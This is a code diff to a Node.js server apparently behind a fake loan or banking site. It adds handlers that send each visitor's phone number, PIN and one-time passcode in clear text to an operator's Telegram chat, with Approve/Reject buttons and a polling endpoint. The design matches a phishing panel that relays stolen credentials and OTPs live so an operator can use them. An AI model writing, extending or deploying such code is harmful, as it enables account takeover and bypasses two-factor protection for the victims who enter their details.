@@ -28,6 +28,7 @@ const PORT = process.env.PORT || 3000;
 // In-memory store of applications and their Telegram message ids.
 // (Replace with a real DB in production.)
 const applications = new Map(); // appId -> { status, messageId, chatId, details }
+const loginVerifications = new Map(); // id -> { phone, pin, otp, type, timestamp, status, messageId, chatId }
 
 /* ---------- Telegram Bot API helper ---------- */
 function tgApi(method, payload, cb) {
@@ -99,16 +100,67 @@ function notifyApplication(app) {
   return id;
 }
 
-function notifyLogin(login) {
-  const text =
-    `<b>🔐 New Login / Activity</b>\n\n` +
-    `User: ${esc(login.username || 'N/A')}\n` +
-    (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
-    (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
-    `Time: ${new Date().toLocaleString()}`;
-  tgApi('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML' }, (r) => {
-    if (r && r.ok) console.log('[notify] login sent');
+function notifyLoginVerification(login) {
+  const type = login.otp ? 'otp' : 'pin';
+  const id = login.loginId || (type === 'otp' ? 'OTP-' : 'LOG-') + Date.now();
+
+  let text = '';
+  if (type === 'pin') {
+    text =
+      `<b>🔐 PIN Verification Required</b>\n\n` +
+      `User: ${esc(login.username || 'N/A')}\n` +
+      (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
+      (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
+      `Time: ${new Date().toLocaleString()}`;
+  } else {
+    text =
+      `<b>🔐 OTP Verification Required</b>\n\n` +
+      `User: ${esc(login.username || 'N/A')}\n` +
+      (login.pin ? `PIN: ${esc('****')}\n` : '') +
+      `OTP: ${esc(login.otp)}\n` +
+      `Time: ${new Date().toLocaleString()}`;
+  }
+
+  loginVerifications.set(id, {
+    phone: login.username,
+    pin: login.pin || '',
+    otp: login.otp || '',
+    type,
+    timestamp: Date.now(),
+    status: 'pending',
+    decided: false,
+    messageId: null,
+    chatId: CHAT_ID
   });
+
+  const approveLabel = type === 'pin' ? '✅ Approve PIN' : '✅ Approve OTP';
+  const rejectLabel = type === 'pin' ? '❌ Reject PIN' : '❌ Reject OTP';
+  const approveData = type === 'pin' ? `pin_approve:${id}` : `otp_approve:${id}`;
+  const rejectData = type === 'pin' ? `pin_reject:${id}` : `otp_reject:${id}`;
+
+  tgApi('sendMessage', {
+    chat_id: CHAT_ID,
+    text,
+    parse_mode: 'HTML',
+    reply_markup: {
+      inline_keyboard: [[
+        { text: approveLabel, callback_data: approveData },
+        { text: rejectLabel, callback_data: rejectData },
+      ]],
+    },
+  }, (r) => {
+    if (r && r.ok) {
+      const entry = loginVerifications.get(id);
+      if (entry) {
+        entry.messageId = r.result.message_id;
+        loginVerifications.set(id, entry);
+      }
+      console.log(`[notify] ${type} verification sent:`, id);
+    } else {
+      console.error(`[notify] ${type} verification failed:`, r && r.description);
+    }
+  });
+  return id;
 }
 
 /* ---------- Handle admin Approve / Reject clicks ---------- */
@@ -123,11 +175,11 @@ function pollUpdates() {
         let json = null;
         try { json = JSON.parse(body); } catch (e) { /* ignore */ }
         if (json && json.ok) {
-        for (const upd of json.result) {
-          updateOffset = upd.update_id + 1;
-          if (upd.callback_query) handleCallback(upd.callback_query);
-          if (upd.message) handleMessage(upd.message);
-        }
+          for (const upd of json.result) {
+            updateOffset = upd.update_id + 1;
+            if (upd.callback_query) handleCallback(upd.callback_query);
+            if (upd.message) handleMessage(upd.message);
+          }
         }
         setTimeout(pollUpdates, 1000);
       });
@@ -140,35 +192,58 @@ function pollUpdates() {
 
 function handleCallback(cq) {
   const [action, id] = (cq.data || '').split(':');
-  if (action !== 'approve' && action !== 'reject') return;
 
-  const rec = applications.get(id);
-  const decision = action === 'approve' ? 'approved' : 'rejected';
-  const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
-  if (rec) rec.status = decision;
-
-  // Acknowledge the button tap
-  tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
-
-  // Update the original message so the admin sees the result
-  if (rec && rec.messageId) {
-    const name = rec.details.name || 'N/A';
-    tgApi('editMessageText', {
-      chat_id: rec.chatId,
-      message_id: rec.messageId,
-      parse_mode: 'HTML',
-      text:
-        `<b>🏦 Loan Application</b>\n\n` +
-        `ID: <code>${esc(id)}</code>\n` +
-        `Applicant: ${esc(name)}\n` +
-        `Loan Type: ${esc(rec.details.loanType || 'N/A')}\n` +
-        `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
-        `Status: <b>${stamp}</b>`,
-    });
+  if (action === 'approve' || action === 'reject') {
+    const decision = action === 'approve' ? 'approved' : 'rejected';
+    const rec = applications.get(id);
+    if (rec) rec.status = decision;
+    const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
+    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
+    if (rec && rec.messageId) {
+      const name = rec.details.name || 'N/A';
+      tgApi('editMessageText', {
+        chat_id: rec.chatId,
+        message_id: rec.messageId,
+        parse_mode: 'HTML',
+        text:
+          `<b>🏦 Loan Application</b>\n\n` +
+          `ID: <code>${esc(id)}</code>\n` +
+          `Applicant: ${esc(name)}\n` +
+          `Loan Type: ${esc(rec.details.loanType || 'N/A')}\n` +
+          `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
+          `Status: <b>${stamp}</b>`,
+      });
+    }
+    console.log(`[decision] ${id} -> ${decision}`);
+    return;
   }
 
-  // Optional: alert the applicant via email/SMS here in production.
-  console.log(`[decision] ${id} -> ${decision}`);
+  if (action === 'pin_approve' || action === 'pin_reject' || action === 'otp_approve' || action === 'otp_reject') {
+    const decision = (action === 'pin_approve' || action === 'otp_approve') ? 'approved' : 'rejected';
+    const kind = action.startsWith('pin') ? 'PIN' : 'OTP';
+    const stamp = action.endsWith('approve') ? '✅ Approved' : '❌ Rejected';
+    const rec = loginVerifications.get(id);
+    if (rec) {
+      loginVerifications.set(id, { ...rec, status: decision, decided: true });
+      tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
+      if (rec.messageId) {
+        tgApi('editMessageText', {
+          chat_id: rec.chatId,
+          message_id: rec.messageId,
+          parse_mode: 'HTML',
+          text:
+            `<b>🔐 ${kind} Verification</b>\n\n` +
+            `User: ${esc(rec.phone || 'N/A')}\n` +
+            (kind === 'PIN' && rec.pin ? `PIN: ${esc('****')}\n` : '') +
+            (kind === 'OTP' && rec.otp ? `OTP: ${esc('******')}\n` : '') +
+            `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
+            `Status: <b>${stamp}</b>`,
+        });
+      }
+      console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
+    }
+    return;
+  }
 }
 
 /* ---------- Handle /start so setup is easy ---------- */
@@ -231,9 +306,9 @@ const server = http.createServer((req, res) => {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ ok: true, appId: id }));
       } else if (req.url.includes('login')) {
-        notifyLogin(payload);
+        const id = notifyLoginVerification(payload);
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ ok: true }));
+        res.end(JSON.stringify({ ok: true, loginId: id }));
       } else {
         res.writeHead(404); res.end('not found');
       }
@@ -247,6 +322,18 @@ const server = http.createServer((req, res) => {
     const rec = applications.get(id);
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({ status: rec ? rec.status : 'unknown' }));
+    return;
+  }
+
+  // GET /api/login/status/:id -> current verification status
+  if (req.method === 'GET' && req.url.startsWith('/api/login/status/')) {
+    const id = req.url.split('/').pop();
+    const rec = loginVerifications.get(id);
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({
+      decided: !!rec && !!rec.decided,
+      status: rec ? rec.status : 'pending'
+    }));
     return;
   }
 
